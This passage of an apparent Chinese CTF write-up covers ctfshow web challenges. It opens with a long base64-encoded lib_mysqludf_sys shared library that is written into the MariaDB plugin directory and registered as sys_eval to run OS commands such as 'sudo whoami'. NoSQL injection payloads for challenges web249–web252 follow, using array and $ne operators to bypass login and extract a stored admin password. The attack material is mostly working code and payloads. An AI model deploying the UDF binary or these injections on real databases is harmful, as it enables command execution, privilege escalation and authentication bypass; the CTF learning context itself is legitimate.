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&#x27;|base64 -d &gt; /usr/lib/mariadb/plugin/udf.so</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">create function sys_eval returns string soname &#x27;udf.so&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">select sys_eval(&quot;sudo whoami&quot;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web249">web249<a href="#web249" class="hash-link" aria-label="Direct link to web249" title="Direct link to web249">​</a></h3>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">开始nosql,flag在flag中</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>sql语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //无</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $user = $memcache-&gt;get($id);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>真的不懂诶</p>
<p><a href="https://www.anquanke.com/post/id/97211" target="_blank" rel="noopener noreferrer">https://www.anquanke.com/post/id/97211</a></p>
<p><a href="http://rui0.cn/archives/609" target="_blank" rel="noopener noreferrer">http://rui0.cn/archives/609</a></p>
<p>然后我就看上了里面的数组</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/api/?id[]=flag</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web250">web250<a href="#web250" class="hash-link" aria-label="Direct link to web250" title="Direct link to web250">​</a></h3>
<p>sql语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  $query = new MongoDB\Driver\Query($data);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $cursor = $manager-&gt;executeQuery(&#x27;ctfshow.ctfshow_user&#x27;, $query)-&gt;toArray();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //无过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(count($cursor)&gt;0){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    array_push($ret[&#x27;data&#x27;], $flag);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220112133942881" src="/assets/images/image-20220112133942881-877c92df9f43e23460d442d011615075.png" width="426" height="235" class="img_ev3q"></p>
<p>还是之前那个文章里面写到的($ne是不相等的意思)</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username[$ne]=1&amp;password[$ne]=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web251">web251<a href="#web251" class="hash-link" aria-label="Direct link to web251" title="Direct link to web251">​</a></h3>
<p>还是用上一道payload</p>
<p>但是回显并不是flag，而是</p>
<div class="language-huixian codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-huixian codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">{&quot;code&quot;:0,&quot;msg&quot;:&quot;\u767b\u9646\u6210\u529f &quot;,&quot;count&quot;:1,&quot;data&quot;:[{&quot;_id&quot;:{&quot;$oid&quot;:&quot;61de6a5b504d14f773a7a95b&quot;},&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow666nnneeaaabbbcc&quot;}]}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>改成username不等于admin</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username[$ne]=admin&amp;password[$ne]=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web252">web252<a href="#web252" class="hash-link" aria-label="Direct link to web252" title="Direct link to web252">​</a></h3>
<p>sql语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  db.ctfshow_user.find({username:&#x27;$username&#x27;,password:&#x27;$password&#x27;}).pretty()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
